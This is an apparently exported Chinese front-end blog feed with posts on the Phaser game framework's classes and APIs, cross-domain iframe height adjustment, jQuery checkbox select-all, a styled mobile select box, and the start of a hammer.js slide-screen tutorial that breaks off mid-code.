    <content type="text"><![CDATA[Phaser 介绍Phaser 是一款专门用于桌面及移动 HTML5 2D 游戏开发的开源免费框架，提供 JavaScript和 TypeScript 双重支持，内置游戏对象的物理属性，采用 Pixi.js 引擎以加快 Canvas 和WebGL 渲染，基于浏览器支持可自由切换。本文将对以下类进行简单介绍：table td{text-indent:10px}&nbsp;Core核心Game游戏Group组World世界Loader载入器Time时间Camera摄像机State Manager状态管理器Tween Manager补间动画管理器Sound Manager声音管理器Input Manager输入管理器Scale Manager缩放管理器&nbsp;Game Objects游戏对象Factory (game.add)工厂Creator (game.make)创建者Sprite精灵Image图像Sound声音Emitter发射器Particle粒子Text文本Tween补间动画BitmapText位图文字Tilemap瓦片地图BitmapData位图数据RetroFont复古字体Button按钮Animation动画Graphics图形RenderTexture渲染纹理TileSprite瓦片精灵Geometry几何图形&nbsp;Circle圆Rectangle矩形Point点Line直线Ellipse椭圆Polygon多边形&nbsp;Physics物理引擎Arcade PhysicsArcade 物理引擎Body刚体P2 PhysicsP2 物理引擎Body刚体Spring弹簧CollisionGroup碰撞组ContactMaterial接触物质Ninja PhysicsNinja 物理引擎Body刚体&nbsp;Input输入Input Handler输入处理Pointer指针Mouse鼠标Keyboard键盘Key按键Gamepad游戏手柄&nbsp;核心CoreGameGame 对象是游戏的核心，它提供了一个快速调用公共函数和处理启动过程的渠道。&nbsp;GroupGroup（组）是一个用于显示各种对象（包括 Sprites 和 Images）的容器。Group 将显示/场景图组成了逻辑树的结构，应用到 Group 上的变换会应用到它的子对象上。例如。当 Group 被移动/旋转/缩放时，所有的子对象同时也会被移动/旋转/缩放。此外，Group 也提供了对快速对象池和对象回收的支持。Group 可以显示对象，同时也可能作为其他组的子对象。&nbsp;World一个游戏只拥有一个 World(世界)。World 是一个抽象空间，所有游戏对象都生存在 World中。它它可以是任意尺寸大小，不受舞台的边界限制。你可以通过相机来查看世界。所有的游戏对象都以基于世界的坐标而生存在 World 中。默认情况下，World 的尺寸大小与舞台一致。&nbsp;LoaderLoader（加载器）用于处理所有外部内容的加载，例如图像、声音、纹理图集和数据文件。它把 Image()载入和 XMLHttpRequest 对象结合在一起，提供了载入进度显示和载入完成的回调功能。&nbsp;Time这是一个核心内部游戏时钟。它维护了一个消逝时间，计算已消逝的时间值。这可用于游戏对象的运动、补间动画，还处理一个标准的定时器池。要创建一个普通的定时事件，可使用 Phaser.Timer。&nbsp;CameraCamera（摄像机）是观察游戏世界的视野。它有一个确定的位置和大小，并且只渲染在它视野范围内的对象。游戏启动时候，会自动创建一个跟舞台相同大小的摄像机。通过改变Phaser.Camera.x/y 的值可以在世界中移动摄像机。&nbsp;State Manager状态管理器负责载入、设置、切换游戏状态。&nbsp;Tween** **ManagerPhaser.Game 维护了一个单一的 TweenManager 实例，所有补间动画对象都是由它创建和更新的。补间被钩入游戏时钟中，使系统暂停，并根据游戏状态而调整。TweenManager 主要是基于 tween.js（http://soledadpenades.com）。区别是：补间动画属于游戏的 TweenManager 实例，而不是一个全局 TWEEN 对象。它提供了一些包装了信号的回调方法，还有一些用于修补关于属性和完成错误的问题。完整的贡献者名单请参见：https://github.com/sole/tween.js。&nbsp;Sound Manager声音管理器负责通过传统的 HTML 音频标签或 Web 音频（需浏览器支持）来播放音频。注意：在 Linux 的 Firefox25 及以上版本中，如果你在 about:config 中禁用了 media.gstreamer，则无法播放 mp3 或 m4a 文件。音频文件的类型及其编码方式是极其重要的。不是所有的浏览器能播放所有的格式。这里有一份很好的参考：http://hpr.dogphilosophy.net/test/。如果你在某个页面上没有正确的刷新 Phaser 游戏（例如在 AngularJS 项目中），你会很快从AudioContext 节点跑飞掉。如果在创建 game 前在 window 对象上创建了一个全局的PhaserGlobal 变 量 ， 则 当 game销 毁 时 ， 当 前 的 AudioContext会 保 存 到window.PhaserGlobal.audioContext，并且在 game 重启后重用这个变量。&nbsp;Input ManagerPhaser.Input 是所有输入设备的管理器，包括鼠标、键盘、触摸和 MSPointer。 输入管理器在主游戏循环中会自动被更新。&nbsp;Scale ManagerScaleManager 对象控制了缩放、大小变化和游戏大小与显示画布之间的对齐操作。游戏大小是游戏的逻辑尺寸，显示画布作为 HTML 元素也有其自己的尺寸。缩放的计算受包围在外面的父容器的大小（显示画布的父容器/元素的大小）影响很大。画布的父容器的有效 CSS 规则对于缩放管理器的操作来说扮演了一个很重要的角色。显示画布或者游戏尺寸，依赖于缩放模式，被更新以使得能够最好的适应父容器尺寸。在全屏模式或者 parentIsWindow 模式，父容器尺寸就是可视化视图（参见 getParentBounds）。父容器和显示画布包括以下准则：1、给游戏画布的父元素添加样式以控制你固执父容器的大小，并因此而控制显示画布的大小和布局。2、父元素的 CSS 样式应该有效地运用最大（和最小）的边界行为。3、 父元素不能应用 padding。如果确实需要使用 padding，那么把它应用父容器的父容器，或者使用 margin。4、不应该改变或者指定显示画布的 CSS 样式（例如边缘留空，大小），因为这可能会被ScaleManager 更新掉。&nbsp;游戏对象GameObjectsFactory (game.add)GameObjectFactory 是一个使用 game.add 来创建很多常见游戏对象的快速方法。创建出来的对象会自动被添加到适当的管理器、世界、或者用户指定的组中。&nbsp;Creator (game.make)GameObjectCreator 是一个创建游戏对象的快速方法，但是并并不会把对象添加到游戏世界中。对象创建者可以被 game.make 访问。&nbsp;Sprite精灵是游戏的生命体，几乎可用于所有的可视化物体。基本上，精灵是有一套坐标和渲染在画布上的纹理所组成。精灵也包括了一些额外的属性，例如物理移动（通过 Sprite.body）、输入处理（通过 Sprite.input）、事件（通过 Sprite.events）、动画（通过 Sprite.animations），摄像机选择等等。&nbsp;Image图像是一个轻量级对象，你可以使用它来显示任何不需要物理引擎或者动画的任务东西。它可以旋转、缩放、剪切，并接收输入事件。它可以完美的用于标识、背景、简单的按钮和其他非精灵类图形。&nbsp;Sound声音类&nbsp;EmitterEmitter 是一个使用 Arcade 物理引擎的轻量级粒子发射器。它可用于一次性的爆炸，或者像雨、火那样的连续性效果。它所有真正做的就是在设定的时间间隔里发射出 Particle（粒子）对象，并相应的修正他们的位置和速度。&nbsp;ParticleParticles（粒子）是精灵的扩展类，它由粒子发射器（例如 Phaser.Particles.Arcade.Emitter）发射出去。&nbsp;Text文本对象创建了一个本地的隐藏 Canvas 对象，先把文本渲染上去，然后再把纹理渲染上去。正因为如此，你只能显示当前已经被载入的，且对于浏览器有效的字体。它不会为你载入字体 。 这 里 有 一 个 列 表 罗 列 了 不 同 移 动 浏 览 器 支 持 的 默 认 字 体 ：http://www.jordanm.co.uk/tinytype&nbsp;TweenTween（补间）允许你在一个指定的时间周期内更改一个目标对象的一个或多个属性。这个可用于让移动精灵 alpha 通道变化（即透明度变化）、缩放或者移动。使用 Tween.to 或者Tween.from 来设置 tween 值。你可以在同一个 Tween 上多次调用 Tween.to 来对同一个对象创建多个 tween。补充一下，以这种方式指定的 tween 会变成子 tween，并且会按次序播放。你可使用用 Tween.timeScale 和 Tween.reverse 来控制这个 Tween 及其所有子 tween 的回放。&nbsp;BitmapTextBitmapText（位图文字）对象包含了一个纹理文件和一个描述字体布局的 XML 文件。在 Windows 上，你可以使用免费软件 BMFont: http://www.angelcode.com/products/bmfont/在 OS X 上，我们建议使用 Glyph Designer: http://www.71squared.com/en/glyphdesigner对于网页，有很好的 Littera: http://kvazars.com/littera/&nbsp;TilemapPhaser.Tilemap（瓦片地图）可以用一个 JSON 文件或者 CSV 文件来填充数据。第一个参数是传入一个缓存键值。当要使用瓦片数据时，你只需要提供这个键值。当使用 CSV 数据时，你必须提供这个键值和瓦片的宽、高数据。如果你想创建一个空的瓦片地图，想后面再填充，你可以不指定任何参数然后再调用 Tilemap.create，或者也可以在这里传入地图和瓦片的尺寸。注意，所有的瓦片地图在计算尺寸时都使用一个基本的瓦片尺寸，但是 TilemapLayer可能会有自己独立的优先级更高的瓦片尺寸。瓦片地图要使用 TilemapLayer 来渲染并显示出来。它不会自己直接添加到显示列表里。一个地图可能会有多个层次。你可以对地图数据进行复制、粘贴、填充操作，也可以把瓦片移来移去。&nbsp;BitmapDataBitmapData（位图数据）对象包含了一个 Canvas 元素，你可以通过一些普通的 Canvas 上下文操作在这个元素上绘制任何你喜欢的东西。单一的 BitmapData 可以被用来作为一个或多个图像或者精灵的纹理。所以，如果你需要动态创建精灵的纹理，这是个很好的选择。&nbsp;RetroFontRetro Font（复古字体）类似于 BitmapFont（位图字体），他使用纹理来渲染字体。然而与BitmapFont 不同的是，RetroFont 里的每一个文字的尺寸都是一样的。这个与 sprite sheet（精灵表）类似。你通常可以在一些老的 8 位、16 位游戏中查到字体表。&nbsp;Button按钮是一个特殊类型的精灵，他能自动建立对指针事件的处理。这里是四种按钮响应的状态：1、Over（经过） - 指针移动经过按钮。这个也就是 hover；2、Out（离开） - 指针曾经移动经过过按钮，现在离开了按钮；3、Down（按下） - 指针被按键按下。例如在触摸屏上触摸，或者用鼠标点击；4、Up（抬起） - 指针在被按钮按下后又释放了。&nbsp;Animation一 个 Animation （ 动 画 ） 实 例 包 含 了 一 个 单 一 的 动 画 和 用 于 播 放 的 空 间 。 它 通 过AnimationManager 来创建，由多个 Animation.Frame 对象组成，属于某个单一的游戏对象（例如：精灵）。&nbsp;GraphicsGraphics（图形）对象&nbsp;RenderTextureRenderTexture（渲染纹理）是一个特殊的问题，它允许任何显示对象在它上面渲染。它允许你把许多复杂的对象渲染在一个单一的方框内（利用 WebGL），然后再用作其他显示对象的纹理。这个生成纹理是实时的。&nbsp;TileSpriteTileSprite（瓦片精灵）是个有着重复纹理的精灵。纹理可以被滚动、缩放，并且自动包裹边缘。请注意，TileSprites 和普通的精灵默认没有输入处理方法和物理引擎刚体，两者都必须要启用后才会具有这些特性。&nbsp;几何图形 **Geometry**Circle通过指定中心坐标（指定 x 和 y 参数）和直径参数来创建圆形。如果你没有指定参数，那么x，y，直径半径默认为 0。&nbsp;Rectangle通过指定左上角（指定 x 和 y 参数）、宽、高参数来创建一个矩形。如果没有指定参数，则矩形的 x，y，宽，高都默认是 0。&nbsp;Point点对象表示的是二维坐标系统上的一个位置， 表示水平方向，y 表示垂直方向。var myPoint= new Phaser.Point(); 这段代码在(0,0)上创建了一个点。你也可以把这个作为一个二维向量，你可以在这个类中找到一些不同的向量相关函数。&nbsp;Line通过指定起始点和结束点来创建一条直线。&nbsp;Ellipse通过指定椭圆外接矩形的左上角坐标（指定 x 和 y 参数）、宽、高来创建一个椭圆。&nbsp;Polygon多边形的点可以通过多种方式来设置：1、点对象数组： [new Phaser.Point(x1, y1), …]2、包含 x/y 公共属性的对象数组： [obj1, obj2, …]3、包含表示坐标的成对数据的数组： [x1,y1, x2,y2, …]4、离散的 Point 参数： setTo(new Phaser.Point(x1, y1), …)5、离散的包含 x/y 公共属性的对象： setTo(obj1, obj2, …)6、离散的包含表示坐标的成对数据： setTo(x1,y1, x2,y2, …)&nbsp;物理引擎PhysicsArcade PhysicsArcade 物理引擎。包含了一些碰撞、重叠、运动等函数。&nbsp;Body刚体是一个单一的精灵，所有的物理操作都是针对这个刚体，而不是针对精灵本身。例如，你设置的速度、加速度、边界值都是针对的刚体。&nbsp;P2 PhysicsP2 物理引擎。你可以用来创建材料、监听事件、在物理仿真中添加刚体。&nbsp;BodyP2 物理引擎的刚体。注意，当刚体绑定到一个精灵的时候，为了避免在移动设备上单像素抖动，我们强烈建议使用精灵的尺寸并包含两个轴，例如，要使用 128x128 而不是 127x127。另外，在 P2 刚体的时候，它的 x/y 轴锚点为 0.5，也就是刚体的中心位置。&nbsp;Spring创建一根线性的连接两个刚体的弹簧。弹簧有静止长度、阻尼、刚度等属性。&nbsp;CollisionGroup碰撞组&nbsp;ContactMaterial定义一种物理材料&nbsp;Ninja PhysicsNinja 物理引擎。本引擎由 Metanet 软件公司制作并用于 Flash，由 Richard Davey 发布JavaScript 版本。它允许使用 AABB（轴对齐矩形边界框）和圆形瓦片碰撞。瓦片可以是任意 34 种不同的类型，包括斜坡、凹凸形状。它目前发展的还算好，但是在扩展性和优化上还需要进一步成熟起来。这里有一些社区为它添加的特性：1、AABB 与 AABB 的碰撞2、AABB 与 Circle 的碰撞3、支持 AABB 和 Circle 的“固定”属性4、多路碰撞，这样 AABB 或者圆形就可以从下往上穿过瓦片，并停在上面5、用于快速刚体和瓦片组查询的四叉树和空间网格6、内部数学数量优化、减少临时变量的生成7、扩展重力和边界功能，允许分离的 x/y 轴值8、支持与精灵关联的刚体的锚点不一定是 0.5你可以自由的使用上面的特性，并用你的代码提交 Pull 请求！一定要包含测试用例哦。&nbsp;输入InputInput Handler输入句柄会绑定到一个指定的精灵，并负责管理针对这个精灵的所有输入事件。&nbsp;Pointer由鼠标、触摸和 MSPoint 管理器 使用，也触摸屏上的一个手指。&nbsp;Mouse处理鼠标与浏览器的各种交互。这个类捕捉了所有发生在游戏画布对象上的鼠标事件，同时也增加了一个鼠标抬起监听器，用于捕捉鼠标不在游戏上的鼠标按键释放事件。&nbsp;Keyboard监控键盘输入、分发键盘事件。由于硬件限制，很多键盘无法处理一些组合按键。&nbsp;Key如果你需要用指定按键实现更细的操作，你可以使用这个对象。&nbsp;Gamepad处理游戏手柄输入和事件分发。请调用 gamepad.start()。目前还只处于实现阶段，并且只有部分浏览器支持。]]></content>
      <categories>
        <category>Phaser</category>
      </categories>
      <tags>
        <tag>phaser中文api</tag>
        <tag>phaser中文文档</tag>
        <tag>Phaser中文说明文档</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[H5游戏开发之phaser学习笔记（一）]]></title>
    <url>%2F2015%2F08%2F19%2Fphaser%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[1、Phaser.Game(width, height, renderer, parent, state, transparent, antialias, physicsConfig)width: 游戏的宽度,也就是用来渲染游戏的canvas的宽度，单位为pxheight: 游戏的高度，也就是用来渲染游戏的canvas的高度，单位为pxrenderer: 使用哪种渲染方式，Phaser.CANVAS 为使用html5画布，Phaser.WEBGL 为使用性能更加好的WebGL来渲染，Phaser.AUTO为自动侦测，如果浏览器支持WebGL则使用WebGL,否则使用Canvasparent: 用来放置canvas元素的父元素，可以是一个元素id，也可以是dom元素本身，phaser会自动创建一个canvas并插入到这个元素中。state: state可以理解为场景，在这里指定state表示让游戏首先加载这个场景，但也可以不在这里指定state，而在之后的代码中决定首先加载哪个state。关于state我后面还会有详细的说明。transparent: 是否使用透明的canvas背景antialias: 是否启用抗锯齿physicsConfig: 游戏物理系统配置参数实例：var game = new Phaser.Game(288,505,Phaser.AUTO,’game’); //实例化一个Phaser的游戏实例&nbsp;2、setPreloadSprite&gt;(sprite, direction)sprite：在加载过程中会出现的精灵或图像。direction：等于0精灵将被水平裁剪，等于1精灵将被垂直裁剪实例：var preloadSprite=game.add.sprite(34,game.height/2,’loading’);game.load.setPreloadSprite(preloadSprite); //用setPreloadSprite方法来实现动态进度条的效果，preloadSprite为load的精灵Loader对象提供了一个setPreloadSprite 方法，只要把一个sprite对象指定给这个方法，那么这个sprite对象的宽度或高度就会根据当前加载的百分比自动调整，达到一个动态的进度条的效果。&nbsp;3、new TileSprite(game, x, y, width, height, key, frame)x：tilesprite的x坐标y：tilesprite的y坐标width：tilesprite的宽度height：tilesprite的高度key：要使用sprite的key值frame：tilesprite使用精灵的帧TileSprite本质上还是一个sprite对象，不过这个sprite的贴图是可以移动的，并且会自动平铺来弥补移动后的空缺，所以我们的素材图片要是平铺后看不出有缝隙，就可以拿来当做TileSprite的移动贴图了。TileSprite的贴图既可以水平移动也可以垂直移动，或者两者同时移动，我们只需要调用TileSprite对象的autoScroll(x,y)方法就可以使它的贴图动起来了，其中x是水平方向的速度，y是垂直方向的速度。实例：var bg = game.add.tileSprite(0,0,game.width,game.height,’background’); //当作背景的tileSpritevar ground = game.add.tileSprite(0,game.height-112,game.width,112,’ground’).autoScroll(-100,0); //当作地面的tileSpritebg.autoScroll(-10,0); //让背景动起来ground.autoScroll(-100,0); //让地面动起来&nbsp;4、spritesheet(key, url, frameWidth, frameHeight, frameMax, margin, spacing)key : 给这张图片指定的名称，以后在创建sprite等对象时会要用到的url: 图片的地址frameWidth : 图片中每帧的宽度frameHeight : 图片中每帧的高度frameMax : 最多有几帧margin : 每帧的外边距spacing : 每帧之间的间隔实例：game.load.spritesheet(‘bird’,’assets/bird.png’,34,24,3); //鸟&nbsp;5、：Phaser.Group，也就是组。组相当于一个父容器，我们可以把许多对象放进一个组里，然后就可以使用组提供的方法对这些对象进行一个批量或是整体的操作。比如要使组里的对象同意进行一个位移，只需要对组进行位移就可以了，又比如要对组里的所有对象都进行碰撞检测，那么就只需要对这个组对象进行碰撞检测就行了。下面我们要制作的这个游戏标题是由一张文字图片和一支鸟组成的，我们就是把这两个东西放在一个组中，然后来进行整体的操作。方法：create(x,y,key) 通过组的create方法创建标题图片并添加到组里实例：var titleGroup=game.add.group();//创建存放标题的组titleGroup.create(0,0,’title’);//通过组的create方法创建标题图片并添加到组里var bird=titleGroup.create(190,10,’bird’);&nbsp;6、sprite对象有个animations属性，代表的是Phaser中专门管理动画的对象：AnimationManager，该对象有一个add方法，用来添加动画，还有一个play方法，用来播放动画add(name, frames, frameRate,loop,useNumericIndex)name: 动画名称，即“运行”，“火”，“走”。frames:对应于该帧的数字/字符串数组，以添加到该动画中，并在该命令中。例如，[ 1，2，3 ]或[ ‘run0 ‘，’run1，run2 ]）。如果空所有帧将被使用。frameRate:动画应该发挥的速度。每秒的速度是按每秒的帧进行的。loop:是否循环useNumericIndex:是否使用数字索引（默认）或字符串的给定的帧play(name, frameRate,loop,killOnComplete)name：要播放动画的名称frameRate:帧频率loop：是否循环killOnComplete：如果设置为真，当动画完成时（只有loop==false）父精灵将被杀死。实例：bird.animations.add(‘fly’); //给鸟添加动画bird.animations.play(‘fly’,12,true);//播放动画titleGroup.x = 35; //调整组的水平位置titleGroup.y = 100; //调整组的垂直位置&nbsp;7、Tween对象，是专门用来实现补间动画的。通过game.add的tween方法得到一个Tween对象,这个方法的参数是需要进行补间动画的物体。然后我们可以使用Tween对象的to方法来实现补间动画。to(properties, duration, ease, autoStart, delay, repeat, yoyo)properties :一个js对象，里面包含着需要进行动画的属性，如上面代码中的 {y:120}duration : 补间动画持续的时间，单位为毫秒ease : 缓动函数，默认为匀速动画autoStart : 是否自动开始delay : 动画开始前的延迟时间，单位为毫秒repeat : 动画重复的次数，如果需要动画永远循环，则把该值设为 Number.MAX_VALUEyoyo : 如果该值为true,则动画会自动反转实例：game.add.tween(titleGroup).to({ y:120 },1000,null,true,0,Number.MAX_VALUE,true); //对这个组添加一个tween动画，让它不停的上下移动&nbsp;PS：1、game.add代表的是Phaser.GameObjectFactory对象，该对象提供了了一系列快捷方法来方便我们创建游戏的各种组件。2、sprite对象有个animations属性，代表的是Phaser中专门管理动画的对象：AnimationManager，该对象有一个add方法，用来添加动画，还有一个play方法，用来播放动画&nbsp;]]></content>
      <categories>
        <category>Phaser</category>
      </categories>
      <tags>
        <tag>phaser</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跨域iframe高度计算]]></title>
    <url>%2F2015%2F08%2F19%2F%E8%B7%A8%E5%9F%9Fiframe%E9%AB%98%E5%BA%A6%E8%AE%A1%E7%AE%97%2F</url>
    <content type="text"><![CDATA[一、同域获取iframe内容这里有两个细节：1. 取iframe内的文档对象，标准浏览器使用contentDocument属性，IE低版本(IE6,7,8)使用document.aspx)属性。2. calcPageHeight函数计算页面的实际高度，标准浏览器使用document.documentElement，低版本IE使用document.body，默认取clientHeight，出现滚动条的取scrollHeight，最后取两个值中最大的。二、跨域获取iframe高度1、主域一致，子域不同比如’a.alitrip.com/a.html’和’b.alitrip.com/b.html’两个跨子域页面a.htmlb.html2、主域、子域均不相同分别有以下资源页面A : a.alitrip.com/a.html页面B：a.alitrip.com/b.html页面C：dev.taobao.com/c.htmlD.js：a.alitrip.com/d.js这四个资源有如下关系1. A里嵌入C，A和C是不同域的，即跨域iframe2. C里嵌入B，C和B是不同域的，但A和B是同域的3. C里嵌入D.js，D.js放在和A同域的项目里通过一个间接方式实现，即通过一个隐藏的B.html来实现高度自适应A.htmlB.html嵌入在C页面中，它是隐藏的，通过parent.parent访问到A，再改变A的iframe(C.html)高度，这是最关键的，因为A，B是同域的所以可以访问A的文档对象等。C.html嵌入在A中，和A不同域，要实现C的自适应，C多高则A里的iframe就设为多高。C里嵌入B.html 和 D.jsD.js在页面C载入后计算其高度，然后将计算出的height赋值给C里引入的iframe（B.html）的src三、页面100%自适应&lt;iframe name=&quot;ifr&quot; id=&quot;ifr&quot; src=&quot;http://www.npm8.com/&quot; style=&quot;overflow-y: scroll;width: 100%;height: 100%;&quot;&gt;&lt;/iframe&gt;四、postMessage数据通信，通过监听window的message事件接收消息postMessage(data,origin)方法接受两个参数data:要传递的数据。origin：字符串参数，指明目标窗口的源，协议+主机+端口号[+URL]，URL会被忽略，所以可以不写，这个参数是为了安全考虑，postMessage()方法只会将message传递给指定窗口，当然如果愿意也可以建参数设置为”*”，这样可以传递给任意窗口，如果要指定和当前窗口同源的话设置为”/“。MessageEvent的几个重要属性data：传递来的messagesource：发送消息的窗口对象origin：发送消息窗口的源（协议+主机+端口号)]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>跨域iframe高度计算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery全选与反选，且解决点击只执行一次的问题]]></title>
    <url>%2F2015%2F08%2F19%2Fjquery%E5%85%A8%E9%80%89%E4%B8%8E%E5%8F%8D%E9%80%89%EF%BC%8C%E4%B8%94%E8%A7%A3%E5%86%B3%E7%82%B9%E5%87%BB%E5%8F%AA%E6%89%A7%E8%A1%8C%E4%B8%80%E6%AC%A1%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930&lt;html&gt;&lt;head&gt;&lt;script src="jquery-1.11.1.min.js" type="text/javascript"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;input type="checkbox" name="chk_list[]" value="1" /&gt;1&lt;input type="checkbox" name="chk_list[]" value="2" /&gt;2&lt;input type="checkbox" name="chk_list[]" value="3" /&gt;3&lt;input type="checkbox" name="chk_list[]" value="4" /&gt;4&lt;input type="checkbox" name="chk_all" id="chk_all" /&gt;全选/取消全选&lt;script type="text/javascript"&gt;$("#chk_all").click(function()&#123;// 使用attr只能执行一次$("input[name='chk_list[]']").attr("checked", $(this).attr("checked"));// 使用prop则完美实现全选和反选$("input[name='chk_list[]']").prop("checked", $(this).prop("checked"));// 获取所有选中的项并把选中项的文本组成一个字符串var str = '';$($("input[name='chk_list[]']:checked")).each(function()&#123;str += $(this).next().text() + ',';&#125;);alert(str);&#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&nbsp;总结：对于HTML元素本身就带有的固有属性，在处理时，使用prop方法。对于HTML元素我们自己自定义的DOM属性，在处理时，使用attr方法。参考 http://www.npm8.com/?p=1137]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>jq全选</tag>
        <tag>jq反选</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在移动端下模拟下拉列表（兼容Ios、Android）]]></title>
    <url>%2F2015%2F08%2F19%2F%E5%9C%A8%E7%A7%BB%E5%8A%A8%E7%AB%AF%E4%B8%8B%E6%A8%A1%E6%8B%9F%E4%B8%8B%E6%8B%89%E5%88%97%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在移动端使用原生的下拉列表（select）会有自带的样式，想要做到自定义样式怎么办呢？&emsp;&emsp;首先第一步会去掉默认样式：-webkit-appearance:none;这些对input下的各类型属性，如：type=”date”，会去掉默认样式，但是这时候对select设置的边框，宽度或者是文字居中显示等等样式都不起作用。这时候就需要模拟select框了。因为select在移动端上会用到手机默认的弹框，所以还是要用到select标签。最终效果如图：html结构如下：1234567&lt;div class="select-area"&gt;&lt;span class="select-value"&gt;&lt;/span&gt;&lt;select&gt;&lt;option&gt;甘肃&lt;/option&gt;&lt;option&gt;兰州&lt;/option&gt;&lt;/select&gt;&lt;/div&gt;select-value用来存储下拉框选中的值，隐藏select，然后利用JS控制显示的下拉框的值。相应的样式如下：1234567891011.select-area&#123; position: relative; overflow: hidden;&#125;.select-area select&#123; position: absolute; left: 0; top: 0; opacity: 0; width: 100%;&#125;接下来就是用到JS来控制选中值的显示了：123456789$(".select-area .select-value").each(function()&#123; if( $(this).next("select").find("option:selected").length != 0 )&#123; $(this).text( $(this).next("select").find("option:selected").text() ); &#125;&#125;);$(".select-area select").change(function()&#123; var value = $(this).find("option:selected").text(); $(this).parent(".select-area").find(".select-value").text(value);&#125;);最终效果就是如上图显示的手机上的效果。说明：需要在手机端才可以看到效果，pc端看不到效果！查看演示点击下载]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动端下拉菜单</tag>
        <tag>移动端模拟下拉列表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用轮播原理结合hammer.js实现简洁的滑屏功能]]></title>
    <url>%2F2015%2F08%2F11%2F%E5%88%A9%E7%94%A8%E8%BD%AE%E6%92%AD%E5%8E%9F%E7%90%86%E7%BB%93%E5%90%88hammer-js%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%B4%81%E7%9A%84%E6%BB%91%E5%B1%8F%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;最近有个任务，做一个非常小的h5的应用，只有2屏，需要做横向的全屏滑动切换和一些简单的动画效果，之前做这种东西用的是fullpage.js和jquery，性能不是很好，于是就想自己动手弄一个简单的东西来实现。最后我用zepto + hammer.js 和轮播的方式解决了这个问题，效果还不错，整个页面不开启Gzip时所有资源请求的数据大小为200KB左右。这篇文章总结下这个方法的实现思路。效果演示（代码下载）：1. 实现要点1）滑屏借鉴bootstrap的carousel插件，不过完全没有它那个复杂，只需要借鉴它的轮播实现思路即可；2）滑屏切换的触发，跟PC不一样，PC通常都是通过元素的点击回调来触发，对于滑屏的页面，完全可以利用window的hashchange事件来处理，这样只要通过超链接设置锚点或者通过js改变location.hash就能触发切换；3）考虑到移动还得支持手势操作，可以使用hammer.js这个手势库，API非常简单易用；4）动画效果可以用animate.css，不过不用把它所有的代码都弄到代码里，只需要拷贝需要的动画效果相关的代码即可；5）替代jquery，首选zepto；6）滑屏效果使用transition动画，为了能够响应动画结束的回调，可以考虑使用transition.js，这个也是Bootstrap提供的工具，不过它默认只能跟jquery使用，要对它稍微改变一下才能跟zepto联合使用。这些要点说的比较粗糙，后面的内容会一一详细介绍。2. html结构空的滑屏页的html结构是这样的：12345678&lt;div id="container" class="container"&gt;&lt;section id="page-1" class="page page--1"&gt;&lt;/section&gt;&lt;section id="page-2" class="page page--2"&gt;&lt;/section&gt;&lt;section id="page-3" class="page page--3"&gt;&lt;/section&gt;&lt;/div&gt;123456789101112131415161718192021222324html,body &#123; height: 100%; -webkit-tap-highlight-color: transparent;&#125;.container,.page &#123; position: absolute; top: 0; left: 0; width: 100%; height: 100%; overflow: hidden;&#125;.page &#123; overflow: hidden; display: none; -webkit-transition: -webkit-transform .4s ease; transition: transform .4s ease; -webkit-backface-visibility: hidden; backface-visibility: hidden;&#125;&emsp;.container与.page初始化的时候采用绝对定位，全屏布局。每一个section.page代表一页，并且默认不显示，所有页的定位都相同，也就是说如果所有页都显示的话，这些页会重叠在一块。demo页的html结构是：1234567891011121314&lt;div id="container" class="container"&gt;&lt;section id="page-1" class="page page--1"&gt;&lt;div class="page__jump"&gt;&lt;a href="#page-2" title=""&gt;下一页&lt;/a&gt;&lt;/div&gt;&lt;p class="page__num animated"&gt;1&lt;/p&gt;&lt;/section&gt;&lt;section id="page-2" class="page page--2"&gt;&lt;div class="page__jump"&gt;&lt;a href="#page-1" title=""&gt;上一页&lt;/a&gt;&lt;a href="#page-3" title=""&gt;下一页&lt;/a&gt;&lt;/div&gt;&lt;p class="page__num animated"&gt;2&lt;/p&gt;&lt;/section&gt;&lt;section id="page-3" class="page page--3"&gt;&lt;div class="page__jump"&gt;&lt;a href="#page-2" title=""&gt;上一页&lt;/a&gt;&lt;/div&gt;&lt;p class="page__num animated"&gt;3&lt;/p&gt;&lt;/section&gt;&lt;/div&gt;demo相关的css就不展示了。其中animated是应用animate.css需要的，animate.css是一个动画库，github上有。3. 滑屏切换的实现思路&emsp;&emsp;滑屏切换就是通过js控制2个要滑动的页增加和删除以下定义的这一些css类实现的：123456789101112131415161718192021222324.page.page--active,.page.page--prev,.page.page--next &#123; display: block;&#125;.page.page--next,.page.page--active.page--active-right &#123; -webkit-transform: translate3d(100%, 0, 0); transform: translate3d(100%, 0, 0);&#125;.page.page--prev,.page.page--active.page--active-left &#123; -webkit-transform: translate3d(-100%, 0, 0); transform: translate3d(-100%, 0, 0);&#125;.page.page--next.page--next-left,.page.page--prev.page--prev-right,.page.page--active &#123; -webkit-transform: translate3d(0, 0, 0); transform: translate3d(0, 0, 0);&#125;.page–active表示当前显示的页，页面初始化后，通过以下js调用，给第一页加上.page—active:1234567var $activePage;//初始化显示第一页(function () &#123; $activePage = $('#page-1'); 